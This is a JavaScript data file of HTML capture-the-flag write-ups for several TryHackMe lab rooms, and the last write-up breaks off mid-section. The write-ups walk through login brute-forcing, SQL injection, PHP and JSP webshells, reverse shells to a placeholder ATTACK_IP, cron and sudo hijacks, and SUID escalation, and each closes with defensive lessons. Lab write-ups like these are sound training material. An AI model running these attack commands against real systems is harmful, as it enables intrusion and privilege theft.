/* ============================================================
   0xmrerror.me — writeups data
   Kept in its own file so main.js stays lean and index.html stays small.
   Load this BEFORE main.js.
   ============================================================ */

'use strict';

const WRITEUPS = {
  'mr-robot': {
    title: 'Mr Robot CTF — WordPress to Root',
    meta: { diff: 'medium', platform: 'thm', time: '20 min' },
    content: `
<h2>Mr Robot CTF — WordPress to Root</h2>
<p>A WordPress blog with a leaked wordlist, weak credentials, a hidden base64 login, and the classic SUID <code>nmap</code> privesc. Goal: 3 keys.</p>

<h3>1 · Reconnaissance</h3>
<pre><code><span class="tok-comment"># Full port scan with services</span>
<span class="tok-func">nmap</span> -sC -sV -p- --min-rate 1000 10.10.x.x

PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https</code></pre>

<h3>2 · Key 1 — robots.txt</h3>
<p><code>robots.txt</code> leaks two files: the first key and <code>fsocity.dic</code>, a wordlist we reuse later.</p>
<pre><code><span class="tok-func">curl</span> http://10.10.x.x/robots.txt

User-agent: *
fsocity.dic
key-1-of-3.txt

<span class="tok-func">wget</span> http://10.10.x.x/key-1-of-3.txt
<span class="tok-func">cat</span> key-1-of-3.txt
073403c8a58a1f80d943455fb30724b9</code></pre>

<h3>3 · WordPress Enumeration</h3>
<pre><code><span class="tok-func">gobuster</span> dir -u http://10.10.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/wp-login   (Status: 200)
/wp-admin   (Status: 301)
/wp-content (Status: 301)

<span class="tok-comment"># fsocity.dic has ~858k words, mostly duplicates — dedup first</span>
<span class="tok-func">sort</span> fsocity.dic | <span class="tok-func">uniq</span> &gt; fs-clean.txt
<span class="tok-func">wc</span> -w fs-clean.txt   <span class="tok-comment"># 11451 unique words</span></code></pre>

<h3>4 · Brute-Forcing wp-login</h3>
<p>WordPress leaks whether a username exists (<code>Invalid username</code> vs wrong-password message). Find the user first, then crack the password with Hydra.</p>
<pre><code><span class="tok-comment"># 1) Find the username</span>
<span class="tok-func">hydra</span> -L fs-clean.txt -p test 10.10.x.x http-post-form \
  "/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=Invalid username" -t 30
<span class="tok-comment"># &gt; username: elliot</span>

<span class="tok-comment"># 2) Crack the password</span>
<span class="tok-func">hydra</span> -l elliot -P fs-clean.txt 10.10.x.x http-post-form \
  "/wp-login.php:log=^USER^&amp;pwd=^PASS^:F=The password you entered for the username" -t 30
<span class="tok-comment"># &gt; creds: elliot : ER28-0652</span></code></pre>
<p><strong>Fast path:</strong> the <code>/license</code> page hides base64 that decodes straight to the same creds.</p>
<pre><code><span class="tok-func">echo</span> ZWxsaW90OkVSMjgtMDY1Mgo= | <span class="tok-func">base64</span> -d
<span class="tok-comment"># elliot:ER28-0652</span></code></pre>

<h3>5 · Reverse Shell via Theme Editor</h3>
<p>Logged in as admin, inject a PHP reverse shell into the theme: <strong>Appearance → Editor → 404.php</strong>. Paste pentestmonkey's shell, set your IP/port, save, then hit the template. Upgrade the dumb shell to a TTY.</p>
<pre><code><span class="tok-comment"># Attacker side — listener</span>
<span class="tok-func">nc</span> -lvnp 4444

<span class="tok-comment"># Trigger the shell</span>
http://10.10.x.x/wp-content/themes/twentyfifteen/404.php

<span class="tok-comment"># Upgrade TTY</span>
<span class="tok-func">python</span> -c <span class="tok-string">'import pty; pty.spawn("/bin/bash")'</span></code></pre>

<h3>6 · Pivot to the robot User</h3>
<p>Shell lands as <code>daemon</code>. <code>/home/robot</code> holds a hash file for the robot user and the key — readable only by robot.</p>
<pre><code><span class="tok-func">cd</span> /home/robot && <span class="tok-func">ls</span> -la
-r-------- 1 robot robot 33 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 password.raw-md5

<span class="tok-func">cat</span> password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

<span class="tok-func">john</span> hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
<span class="tok-comment"># robot : abcdefghijklmnopqrstuvwxyz</span>

<span class="tok-func">su</span> robot
<span class="tok-func">cat</span> /home/robot/key-2-of-3.txt
822c73956184f694993bebb3eb32f0bf</code></pre>

<h3>7 · Privesc — SUID Nmap</h3>
<p>A GTFOBins classic. Old nmap ships an <code>--interactive</code> shell where <code>!</code> runs commands as the binary owner — and <code>/usr/local/bin/nmap</code> has the SUID bit.</p>
<pre><code><span class="tok-func">find</span> / -perm -u=s -type f 2&gt;/dev/null
/usr/local/bin/nmap   <span class="tok-comment"># &lt;-- SUID, owned by root</span>

/usr/local/bin/nmap --interactive
nmap&gt; !sh
<span class="tok-comment"># root shell</span>
<span class="tok-func">cat</span> /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4</code></pre>

<h3>8 · Retrospective</h3>
<p>Attack chain: <code>robots.txt</code> leak → WordPress weak creds → theme-editor shell → MD5 crack → SUID nmap. Key lessons: never ship wordlists publicly, watch for username-oracle login pages, and audit SUID binaries.</p>`
  },

  'ww-buddy': {
    title: 'WWBuddy — SQLi to Env-Var Privesc',
    meta: { diff: 'medium', platform: 'thm', time: '20 min' },
    content: `
<h2>WWBuddy — SQLi to Env-Var Privesc</h2>
<p>A "make friends" site still in development. The chain: a second-order SQL injection resets every password, an unsanitized username poisons an admin log into a PHP shell, a MySQL log leaks a password, and a SUID binary trusts the <code>USER</code> env var. Goal: 3 flags.</p>

<h3>1 · Enumeration</h3>
<pre><code><span class="tok-comment"># Map the room IP to a hostname</span>
<span class="tok-func">echo</span> "<span class="tok-string">10.10.x.x wwbuddy.thm</span>" &gt;&gt; /etc/hosts

<span class="tok-comment"># Port scan</span>
<span class="tok-func">nmap</span> -sV -sC wwbuddy.thm
PORT   STATE SERVICE VERSION
22/tcp open  ssh
80/tcp open  http   Apache

<span class="tok-comment"># Directory enum</span>
<span class="tok-func">gobuster</span> dir -u http://wwbuddy.thm/ -w /usr/share/wordlists/common.txt

/admin  /api  /register  /login  /profile</code></pre>

<h3>2 · Second-Order SQLi — Reset Everyone's Password</h3>
<p>The username is stored unsanitized and later reused inside a raw <code>UPDATE</code> query when you change your own password. Inject a username that makes the <code>WHERE</code> clause match every row — now all passwords become yours.</p>
<pre><code><span class="tok-comment"># 1) Register, then set your username to</span>
<span class="tok-keyword">' or 1=1-- -</span>

<span class="tok-comment"># 2) Change your password to a known value, e.g. adminadmin</span>

<span class="tok-comment"># 3) The backend effectively runs</span>
UPDATE users SET password = <span class="tok-string">'adminadmin'</span>
WHERE old_password = users.old_password
  AND username = <span class="tok-string">''</span> OR <span class="tok-num">1</span>=<span class="tok-num">1</span>-- -

<span class="tok-comment"># 4) Login as any known user — password is now adminadmin</span>
WWBuddy : adminadmin</code></pre>

<h3>3 · Log Poisoning → RCE</h3>
<p>Login as <code>WWBuddy</code> and plant a PHP one-liner as the username. Then log in as <code>Henry</code>, the account allowed into <code>/admin</code> — the dashboard prints every visitor's username unsanitized, so the payload is executed and a <code>cmd</code> parameter appears.</p>
<pre><code><span class="tok-comment"># Username to plant</span>
<span class="tok-string">&lt;?php system($_GET['cmd']); ?&gt;</span>

<span class="tok-comment"># Run commands through /admin</span>
http://wwbuddy.thm/admin/?cmd=<span class="tok-func">id</span>
uid=<span class="tok-num">33</span>(www-data) gid=<span class="tok-num">33</span>(www-data)

<span class="tok-comment"># Reverse shell — URL-encode this and pass it to cmd</span>
<span class="tok-func">bash</span> -i &gt;&amp; /dev/tcp/<span class="tok-string">ATTACK_IP</span>/<span class="tok-num">4444</span> <span class="tok-num">0</span>&gt;&amp;<span class="tok-num">1</span>

<span class="tok-comment"># Attacker listener</span>
<span class="tok-func">nc</span> -lvnp <span class="tok-num">4444</span></code></pre>

<h3>4 · www-data → roberto (MySQL log leak)</h3>
<p>Run <code>linpeas</code>. It surfaces <code>/var/log/mysql/general.log</code>, which records every query — including roberto typing his password into the username box by accident.</p>
<pre><code><span class="tok-func">grep</span> -i roberto /var/log/mysql/general.log
<span class="tok-comment"># &gt; roberto : &lt;password&gt;</span>

<span class="tok-func">ssh</span> roberto@wwbuddy.thm
<span class="tok-comment"># user flag</span>
<span class="tok-func">cat</span> /home/roberto/importante.txt
<span class="tok-comment"># THM{...}</span></code></pre>
<p><code>importante.txt</code> is in Portuguese (Roberto is Brazilian): "Jenny turns 26 next week". The web app uses <code>mm/dd/yyyy</code> as default passwords.</p>

<h3>5 · roberto → jenny (birthday bruteforce)</h3>
<pre><code><span class="tok-comment"># File modified ~Jul 27 2020 → Jenny's birthday in 08/01–08/09/1994</span>
<span class="tok-func">stat</span> /home/roberto/importante.txt | <span class="tok-func">grep</span> Modify

<span class="tok-comment"># Wordlist of candidate mm/dd/yyyy dates</span>
<span class="tok-func">seq</span> <span class="tok-num">1</span> <span class="tok-num">9</span> | <span class="tok-func">awk</span> <span class="tok-string">'{printf "08/0%d/1994\\n", $1}'</span> &gt; datelist.txt

<span class="tok-func">hydra</span> -l jenny -P datelist.txt wwbuddy.thm ssh
<span class="tok-func">ssh</span> jenny@wwbuddy.thm</code></pre>

<h3>6 · jenny → root (SUID + env injection)</h3>
<p><code>/bin/authenticate</code> is SUID-root. Reversing it (Ghidra) shows it builds <code>usermod -G developer &lt;name&gt;</code> from the <code>USER</code> env var and feeds it to <code>system()</code> — so the var itself becomes our injection point.</p>
<pre><code><span class="tok-comment"># Spot the unusual SUID binary</span>
<span class="tok-func">find</span> / -type f -perm -4000 2&gt;/dev/null
/bin/authenticate   <span class="tok-comment"># SUID, owned by root</span>

<span class="tok-comment"># Inject a shell through the env var</span>
<span class="tok-func">export</span> USER=<span class="tok-string">"jenny; bash"</span>
/bin/authenticate

<span class="tok-comment"># root shell — read the flag</span>
root@wwbuddy:~# <span class="tok-func">cat</span> /root/root.txt
<span class="tok-comment"># THM{...}</span></code></pre>

<h3>7 · Retrospective</h3>
<p>Attack chain: second-order SQLi password reset → log-poisoned PHP shell → MySQL log credential leak → birthday bruteforce → SUID env-var injection. Lessons: sanitize every place a username is reused, keep MySQL's general log off, and never trust environment variables in SUID binaries.</p>`
  },

  'broker': {
    title: 'Broker — MQTT Eavesdrop to Webshell',
    meta: { diff: 'medium', platform: 'thm', time: '15 min' },
    content: `
<h2>Broker — MQTT Eavesdrop to Root</h2>
<p>An ActiveMQ server with two exposed services: an MQTT broker that lets anyone subscribe, and a management console with a classic put-shell CVE. Paul and Max thought they were being sneaky. Goal: flag.txt + root.txt.</p>

<h3>1 · Enumeration</h3>
<pre><code><span class="tok-comment"># The hint says the action is on high ports</span>
<span class="tok-func">nmap</span> -sC -sV -p 1001-9999 broker.thm

PORT    STATE SERVICE
1883/tcp open  mqtt
8161/tcp open  http   Jetty 9 (Apache ActiveMQ 5.9.0)</code></pre>

<h3>2 · ActiveMQ Console</h3>
<p>Port 8161 hosts an Apache ActiveMQ dashboard. The default <code>admin:admin</code> works. The <strong>Topics</strong> tab lists a <code>secret_chat</code> topic — that has to be where the "secret" messages flow.</p>

<h3>3 · Eavesdropping on MQTT</h3>
<p>The MQTT broker needs no credentials, so we subscribe to the topic with the Mosquitto client and read the conversation.</p>
<pre><code><span class="tok-func">mosquitto_sub</span> -h broker.thm -t <span class="tok-string">'secret_chat/#'</span> -p <span class="tok-num">1883</span> -V mqttv31
<span class="tok-comment"># &gt; Paul and Max chat about... the game "Hacknet"</span></code></pre>

<h3>4 · CVE-2016-3088 — PUT/MOVE Webshell</h3>
<p>ActiveMQ's <code>/fileserver</code> accepts an HTTP <code>PUT</code> upload but won't execute what's stored there. So we upload a JSP webshell and <code>MOVE</code> it into <code>/admin</code>, which does execute JSP. First leak the absolute path via the <code>%20</code> trick.</p>
<pre><code><span class="tok-comment"># Upload cmd.jsp to /fileserver</span>
<span class="tok-func">curl</span> -u admin:admin -X <span class="tok-keyword">PUT</span> <span class="tok-string">"http://broker.thm:8161/fileserver/cmd.jsp"</span> \
  --data @cmd.jsp -H <span class="tok-string">'Content-Type: text/plain'</span>

<span class="tok-comment"># Leak the absolute path</span>
<span class="tok-func">curl</span> -u admin:admin -X <span class="tok-keyword">GET</span> <span class="tok-string">"http://broker.thm:8161/fileserver/test/%20/%20"</span>
<span class="tok-comment"># &gt; /opt/apache-activemq-5.9.0/webapps/fileserver/</span>

<span class="tok-comment"># MOVE the shell into the executable /admin directory</span>
<span class="tok-func">curl</span> -u admin:admin -X <span class="tok-keyword">MOVE</span> <span class="tok-string">"http://broker.thm:8161/fileserver/cmd.jsp"</span> \
  -H <span class="tok-string">"Destination: http://broker.thm:8161/admin/cmd.jsp"</span>

<span class="tok-comment"># RCE</span>
http://broker.thm:8161/admin/cmd.jsp?cmd=<span class="tok-func">id</span></code></pre>

<h3>5 · Reverse Shell</h3>
<p>Long bash one-liners often get mangled by URL encoding here. Use <code>nc -e</code> or host a <code>msfvenom</code>-generated ELF and fetch it with curl. Then upgrade the TTY.</p>
<pre><code><span class="tok-comment"># Attacker listener</span>
<span class="tok-func">nc</span> -lvnp <span class="tok-num">4444</span>

<span class="tok-comment"># Payload (URL-encode spaces) through the webshell</span>
<span class="tok-func">nc</span> -e /bin/bash <span class="tok-string">ATTACK_IP</span> <span class="tok-num">4444</span>

<span class="tok-comment"># Upgrade TTY, then read the user flag</span>
<span class="tok-func">python3</span> -c <span class="tok-string">'import pty; pty.spawn("/bin/bash")'</span>
<span class="tok-func">cat</span> /home/activemq/flag.txt
<span class="tok-comment"># THM{...}</span></code></pre>

<h3>6 · Privesc — Writable Sudo Script</h3>
<p><code>sudo -l</code> shows activemq can run <code>subscribe.py</code> as root with no password — and the file is owned (and writable) by activemq. Append code that drops a shell.</p>
<pre><code><span class="tok-func">sudo</span> -l
(root) NOPASSWD: /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
<span class="tok-func">ls</span> -l /opt/apache-activemq-5.9.0/subscribe.py
-rw-rw-r-- <span class="tok-num">1</span> activemq activemq <span class="tok-num">768</span> subscribe.py

<span class="tok-func">echo</span> <span class="tok-string">'import os; os.system("/bin/bash")'</span> &gt;&gt; /opt/apache-activemq-5.9.0/subscribe.py

<span class="tok-func">sudo</span> -u root /usr/bin/python3.7 /opt/apache-activemq-5.9.0/subscribe.py
<span class="tok-comment"># &gt; root shell</span>
root@broker:~# <span class="tok-func">cat</span> /root/root.txt
<span class="tok-comment"># THM{...}</span></code></pre>

<h3>7 · Retrospective</h3>
<p>Attack chain: default ActiveMQ creds → MQTT eavesdrop → PUT/MOVE webshell (CVE-2016-3088) → writable sudo script. Lessons: never run a broker with null auth, lock down <code>/fileserver</code>, and audit what your own user-scripted sudo targets.</p>`
  },

  'watcher': {
    title: 'Watcher — LFI to Root in 7 Flags',
    meta: { diff: 'medium', platform: 'thm', time: '30 min' },
    content: `
<h2>Watcher — LFI to Root in 7 Flags</h2>
<p>A boot2root with a long, linear privilege chain: LFI turns into a webshell, then a series of sudo/cron pivots, ending with a root SSH key. Goal: 7 flags.</p>

<h3>1 · Enumeration</h3>
<pre><code><span class="tok-func">nmap</span> -sC -sV watcher.thm
PORT   STATE SERVICE VERSION
21/tcp open  ftp    vsftpd 3.0.3
22/tcp open  ssh
80/tcp open  http   Apache</code></pre>

<h3>2 · LFI → FTP Credentials</h3>
<p><code>post.php</code> does a raw <code>include $_GET["post"]</code> — instant LFI. Use it to read <code>robots.txt</code>, which points to <code>secret_file_do_not_read.txt</code>, which leaks FTP credentials and the upload path.</p>
<pre><code><span class="tok-comment"># Any file, no filtering</span>
http://watcher.thm/post.php?post=<span class="tok-string">/etc/passwd</span>

<span class="tok-comment"># robots → secret file → FTP creds</span>
http://watcher.thm/post.php?post=robots.txt
<span class="tok-comment"># Allow: /flag_1.txt | Allow: /secret_file_do_not_read.txt</span>
http://watcher.thm/post.php?post=secret_file_do_not_read.txt
<span class="tok-comment"># &gt; ftpuser : &lt;password&gt; — files go to /home/ftpuser/ftp/files</span></code></pre>

<h3>3 · FTP Upload → Reverse Shell</h3>
<p>Log into FTP: grab <code>flag_2.txt</code>, then <code>put</code> a PHP reverse shell into the writable <code>files/</code> directory. Trigger it through the LFI using the path from the note.</p>
<pre><code><span class="tok-func">ftp</span> watcher.thm
&gt; get flag_2.txt
&gt; cd files
&gt; put shell.php

<span class="tok-comment"># Listener + trigger via LFI</span>
<span class="tok-func">nc</span> -lvnp <span class="tok-num">4444</span>
http://watcher.thm/post.php?post=<span class="tok-string">../../../../home/ftpuser/ftp/files/shell.php</span>
<span class="tok-comment"># &gt; shell as www-data — flag_3.txt in /var/www/html/more_secrets_a9f10a/</span></code></pre>

<h3>4 · www-data → toby</h3>
<pre><code><span class="tok-comment"># Passwordless sudo to toby</span>
<span class="tok-func">sudo</span> -u toby /bin/bash
<span class="tok-comment"># &gt; toby shell — flag_4.txt in /home/toby</span></code></pre>

<h3>5 · toby → mat (cron poisoning)</h3>
<p><code>/etc/crontab</code> runs <code>/home/toby/jobs/cow.sh</code> as user <code>mat</code> every minute. As toby we can overwrite it with a reverse shell and wait.</p>
<pre><code><span class="tok-func">cat</span> /etc/crontab
<span class="tok-comment"># * * * * * mat /home/toby/jobs/cow.sh</span>

<span class="tok-func">echo</span> <span class="tok-string">'/bin/bash -i &gt;&amp; /dev/tcp/ATTACK_IP/5555 0&gt;&amp;1'</span> &gt; /home/toby/jobs/cow.sh
<span class="tok-func">chmod</span> +x /home/toby/jobs/cow.sh
<span class="tok-comment"># &gt; wait a minute → mat shell → flag_5.txt</span></code></pre>

<h3>6 · mat → will (module injection)</h3>
<p>Will left a note: mat may run <code>will_script.py</code> as will via sudo. It imports <code>get_command</code> from a local <code>cmd.py</code> that mat can edit — override the function to drop a shell while still returning a whitelisted command.</p>
<pre><code><span class="tok-func">sudo</span> -l
<span class="tok-comment"># (will) /usr/bin/python3 /home/mat/scripts/will_script.py</span>

<span class="tok-func">cat</span> &gt; /home/mat/scripts/cmd.py &lt;&lt; <span class="tok-string">'EOF'</span>
<span class="tok-keyword">import</span> os
<span class="tok-keyword">def</span> <span class="tok-func">get_command</span>(num):
    os.system(<span class="tok-string">"/bin/bash -i"</span>)
    <span class="tok-keyword">return</span> <span class="tok-string">"id"</span>
EOF

<span class="tok-func">sudo</span> -u will /usr/bin/python3 /home/mat/scripts/will_script.py <span class="tok-num">1</span>
<span class="tok-comment"># &gt; will shell — flag_6.txt</span></code></pre>

<h3>7 · will → root (base64 SSH key)</h3>
<p>User <code>will</code> is in the <code>adm</code> group, which can read <code>/opt/backups/</code>. Inside is <code>key.b64</code> — decode it and it's an RSA private key for root.</p>
<pre><code><span class="tok-func">id</span>
uid=<span class="tok-num">1000</span>(will) groups=<span class="tok-num">1000</span>(will),<span class="tok-num">4</span>(adm)

<span class="tok-func">ls</span> /opt/backups
key.b64

<span class="tok-func">base64</span> -d key.b64 &gt; key
<span class="tok-func">file</span> key   <span class="tok-comment"># PEM RSA private key</span>
<span class="tok-func">chmod</span> <span class="tok-num">600</span> key
<span class="tok-func">ssh</span> -i key root@localhost
<span class="tok-comment"># &gt; root — final flag</span></code></pre>

<h3>8 · Retrospective</h3>
<p>Attack chain: LFI → FTP creds → uploaded PHP shell → sudo/cron pivots (www-data→toby→mat→will) → base64 root key. Lessons: raw <code>include</code> is a shell factory, cron scripts must not be world-writable, and running python <code>while</code> importing a file your users can edit is a root factory.</p>`
  },

  'fortress': {
    title: 'Fortress — SHA-1 Collision to Root',
    meta: { diff: 'medium', platform: 'thm', time: '30 min' },
    content: `
<h2>Fortress — SHA-1 Collision to Root</h2>
<p>A story-driven box: decompile Python bytecode for credentials, talk to a telnet service, beat a SHA-1 collision login gate to win an SSH key, break out of a restricted shell, and read logs for root. Goal: user.txt + root.txt.</p>

<h3>1 · Setup + Enumeration</h3>
<pre><code><span class="tok-comment"># Map the two virtual hosts</span>
<span class="tok-func">echo</span> "<span class="tok-string">10.10.x.x fortress temple.fortress</span>" &gt;&gt; /etc/hosts

<span class="tok-func">nmap</span> -sC -sV -p- fortress
PORT    STATE SERVICE
22/tcp  open  ssh
5581/tcp open  ftp    (anonymous)
5752/tcp open  telnet
7331/tcp open  http   Apache</code></pre>

<h3>2 · FTP → Python Bytecode</h3>
<p>Anonymous FTP hides <code>.file</code> — Python 2.7 compiled bytecode. Decompile it to see the telnet service's hardcoded username/password, stored as big integers via <code>bytes_to_long</code>.</p>
<pre><code><span class="tok-func">ftp</span> fortress
&gt; ls -la          <span class="tok-comment"># find .file</span>
&gt; get .file

<span class="tok-func">uncompyle6</span> .file
<span class="tok-comment"># &gt; usern = bytes_to_long(b"...")  passw = bytes_to_long(b"...")</span>

<span class="tok-comment"># Decode the longs back to strings</span>
<span class="tok-keyword">from</span> Crypto.Util.number <span class="tok-keyword">import</span> long_to_bytes
<span class="tok-func">print</span>(long_to_bytes(usern).decode(), long_to_bytes(passw).decode())</code></pre>

<h3>3 · Telnet → Secret Page</h3>
<pre><code><span class="tok-func">telnet</span> fortress <span class="tok-num">5752</span>
<span class="tok-comment"># &gt; t3mple_0f_y0ur_51n5</span></code></pre>

<h3>4 · SHA-1 Collision Gate</h3>
<p>The <code>.html</code> version of that page shows its PHP source: it compares <code>user</code> and <code>pass</code> by SHA-1 (which must be identical) and also requires lengths &gt; 600 and &gt; 500 bytes. That's a SHA-1 collision — only a few known pairs exist.</p>
<pre><code><span class="tok-keyword">import</span> requests
c1 = requests.get(<span class="tok-string">"http://localhost/shattered-1.dat"</span>).content
c2 = requests.get(<span class="tok-string">"http://localhost/shattered-2.dat"</span>).content
r = requests.get(
    <span class="tok-string">"http://temple.fortress:7331/t3mple_0f_y0ur_51n5.php"</span>,
    params={<span class="tok-string">'user'</span>: c1, <span class="tok-string">'pass'</span>: c2})
<span class="tok-func">print</span>(r.text)
<span class="tok-comment"># &gt; m0td_f0r_j4x0n.txt — an SSH private key left by h4rdy</span></code></pre>
<p>The <code>shattered.io</code> PDFs are ~825KB — way over GET limits. Use pre-built collision files of ~640 bytes each (e.g. from the 2017 Boston Key Party Prudentialv2 writeup); they pass both length checks.</p>

<h3>5 · SSH h4rdy — Restricted Shell Escape</h3>
<p>h4rdy's shell is rbash: no <code>cd</code>, <code>export</code> or <code>sudo</code>. Force a real shell over SSH, fix PATH, then abuse the sudo rule.</p>
<pre><code><span class="tok-func">chmod</span> <span class="tok-num">600</span> id_rsa
<span class="tok-func">ssh</span> -t -i id_rsa h4rdy@fortress bash
<span class="tok-func">export</span> PATH=<span class="tok-string">$PATH:/bin:/usr/bin</span>

<span class="tok-comment"># h4rdy may run /bin/cat as j4x0n — steal the SSH key</span>
<span class="tok-func">sudo</span> -u j4x0n /bin/cat /home/j4x0n/user.txt
<span class="tok-func">sudo</span> -u j4x0n /bin/cat /home/j4x0n/.ssh/id_rsa</code></pre>

<h3>6 · j4x0n → root (adm group)</h3>
<pre><code><span class="tok-func">ssh</span> -i j4x0n_rsa j4x0n@fortress

<span class="tok-comment"># j4x0n is in the adm group → system logs are readable</span>
<span class="tok-func">id</span>
groups=<span class="tok-num">1001</span>(j4x0n),<span class="tok-num">4</span>(adm)

<span class="tok-func">grep</span> -iE <span class="tok-string">"password|passwd"</span> /var/log/auth.log
<span class="tok-comment"># &gt; leaks root's credentials → su / ssh root</span>
<span class="tok-func">su</span> root
<span class="tok-func">cat</span> /root/root.txt</code></pre>
<p><strong>Shortcut:</strong> <code>/data/setup.sh</code> — the box's own bootstrap script — writes the root flag as the root password, leaking it directly.</p>

<h3>7 · Retrospective</h3>
<p>Attack chain: anonymous FTP bytecode → long/bytes credential decode → telnet info leak → SHA-1 collision login → rbash escape → sudo-cat key theft → adm log read. Lessons: never stash compiled secrets in anonymous FTP, SHA-1 is broken for collisions, and restricted shells are an obfuscation — not a boundary.</p>`
  },

  'umbrella': {
    title: 'Umbrella — Registry Loot to SUID Bash',
    meta: { diff: 'medium', platform: 'thm', time: '25 min' },
    content: `
<h2>Umbrella — Docker Registry to SUID Bash</h2>
<p>A time-tracking app rebuilt around Docker: an open registry leaks DB secrets, MySQL hands over login credentials, a Node.js <code>eval()</code> gives container root, and a bind-mounted logs folder pivots to host root. Goal: user.txt + root.txt.</p>

<h3>1 · Enumeration</h3>
<pre><code><span class="tok-func">nmap</span> -sC -sV umbrella.thm
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1
3306/tcp open  mysql   5.7.40
5000/tcp open  http    Docker Registry v2
8080/tcp open  http    Node.js/Express login</code></pre>

<h3>2 · Docker Registry Loot</h3>
<p>Port 5000 is an unauthenticated Registry. The manifest's <code>history</code> payload carries the image's build-time <code>ENV</code> — the DB password leaks with zero image downloads.</p>
<pre><code><span class="tok-func">curl</span> http://umbrella.thm:5000/v2/_catalog
<span class="tok-comment"># {"repositories":["umbrella/timetracking"]}</span>

<span class="tok-func">curl</span> http://umbrella.thm:5000/v2/umbrella/timetracking/manifests/latest
<span class="tok-comment"># history[].v1Compatibility → Env →</span>
<span class="tok-comment"># DB_HOST=db  DB_USER=root  DB_PASS=Ng1-f3!Pe7-e5?Nf3xe5</span></code></pre>

<h3>3 · MySQL — Dump + Crack</h3>
<pre><code><span class="tok-func">mysql</span> -h umbrella.thm -u root -p<span class="tok-string">'Ng1-f3!Pe7-e5?Nf3xe5'</span>
&gt; SHOW DATABASES;
&gt; USE timetracking; SELECT * FROM users;

<span class="tok-comment"># MD5 hashes → crack with john + rockyou</span>
<span class="tok-func">john</span> hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
<span class="tok-comment"># claire-r:Password1  chris-r:sunshine1  jill-v:letmein  barry-b:sandwich</span></code></pre>

<h3>4 · SSH + Source Review</h3>
<pre><code><span class="tok-func">ssh</span> claire-r@umbrella.thm
<span class="tok-func">cat</span> user.txt

<span class="tok-comment"># App source is in the home dir — read tTracker-src/</span>
<span class="tok-func">cat</span> tTracker-src/app.js
<span class="tok-comment"># /time: let timeCalc = parseInt(eval(request.body.time))  ← eval!</span>

<span class="tok-func">cat</span> tTracker-src/docker-compose.yml
<span class="tok-comment"># app volume:  ./logs:/logs   ← host dir name claire-r can write</span></code></pre>
<p>Wait — the <code>logs/</code> directory is bind-mounted into the container at <code>/logs</code>. Anything the container writes there lands on the host, owned by root.</p>

<h3>5 · eval() → SUID Root Bash</h3>
<p>On the web app (<code>:8080</code>), log in as claire-r. The "Increase time spent" field is passed straight to <code>eval()</code> — the app even advertises math expressions. We use it to run <code>child_process</code> and plant a SUID bash on the host through the bind mount (no reverse shell needed).</p>
<pre><code><span class="tok-comment"># Submit each of these in the time field (POST /time)</span>
require(<span class="tok-string">'child_process'</span>).exec(<span class="tok-string">'cp /bin/bash /logs/bash'</span>)
require(<span class="tok-string">'child_process'</span>).exec(<span class="tok-string">'chown root:root /logs/bash'</span>)
require(<span class="tok-string">'child_process'</span>).exec(<span class="tok-string">'chmod u+s /logs/bash'</span>)

<span class="tok-comment"># On the host as claire-r</span>
<span class="tok-func">~/tTracker-src/logs/bash</span> -p
bash-<span class="tok-num">5.1</span># <span class="tok-func">id</span>
uid=<span class="tok-num">1001</span>(claire-r) euid=<span class="tok-num">0</span>(root)
bash-<span class="tok-num">5.1</span># <span class="tok-func">cat</span> /root/root.txt</code></pre>
<p>Because the app runs as root, <code>chown/chmod</code> succeed; <code>bash -p</code> keeps the elevated euid. Alternatively the same <code>eval()</code> can spawn a reverse shell inside the container.</p>

<h3>6 · Retrospective</h3>
<p>Attack chain: open Registry → ENV secret leak → MySQL dump → hash crack → <code>eval()</code> RCE → bind-mount SUID pivot. Lessons: never bake secrets into image ENV, gate your registry, ban <code>eval()</code> on user input, and bind mounts hand root from container to host.</p>`
  },

  'super-secret-tip': {
    title: 'Super Secret Tip — Jinja SSTI to curl -K Root',
    meta: { diff: 'medium', platform: 'thm', time: '35 min' },
    content: `
<h2>Super Secret Tip — Jinja SSTI to curl -K Root</h2>
<p>A Flask app with a password-protected debugger that renders your input with Jinja — a textbook SSTI. Recover an XOR-encrypted password, get code execution, then turn a <code>curl -K</code> cron job into a root file reader. Goal: flag1 + flag2.</p>

<h3>1 · Enumeration</h3>
<pre><code><span class="tok-func">nmap</span> -sC -sV tip.thm
PORT    STATE SERVICE VERSION
22/tcp  open  ssh
7777/tcp open  http   Flask

<span class="tok-func">gobuster</span> dir -u http://tip.thm:7777 -w /usr/share/wordlists/common.txt
/cloud  /debug</code></pre>

<h3>2 · Smuggle Every File Out of /cloud</h3>
<p><code>/cloud</code> only serves <code>.txt</code> files and <code>source.py</code>, but a null-byte trick (<code>file.py%00.txt</code>) slips the source through and reveals everything.</p>
<pre><code><span class="tok-func">download</span> source.py
<span class="tok-comment"># routes: /cloud /debug /debugresult</span>
<span class="tok-comment"># /debug: password gate + illegal chars  ' &amp; ; %</span>
<span class="tok-comment"># /debugresult: render_template_string(...)   ← SSTI</span>

<span class="tok-comment"># Null-byte bypass on the extension filter</span>
<span class="tok-func">download</span> debugpassword.py%00.txt   <span class="tok-comment"># XOR function + key "ayham"</span>
<span class="tok-func">download</span> supersecrettip.txt         <span class="tok-comment"># XOR-encoded password blob</span>
<span class="tok-func">download</span> ip.py                      <span class="tok-comment"># /debugresult needs X-Forwarded-For: 127.0.0.1</span></code></pre>

<h3>3 · XOR → Debug Password</h3>
<pre><code><span class="tok-comment"># CyberChef: XOR blob with key "ayham" → hex → text</span>
Password: AyhamDeebugg</code></pre>

<h3>4 · SSTI → Shell</h3>
<p>Send the password to <code>/debug</code>; the statement is rendered via Jinja, so <code>{{7*7}}</code> yields 49 at <code>/debugresult</code> (host must be <code>127.0.0.1</code> with the <code>X-Forwarded-For</code> header). Reach <code>os</code> through the config object and run a base64-encoded shell to dodge the illegal characters.</p>
<pre><code><span class="tok-comment"># Debug field (URL-encoded), confirmed at /debugresult with</span>
X-Forwarded-For: <span class="tok-num">127.0.0.1</span>

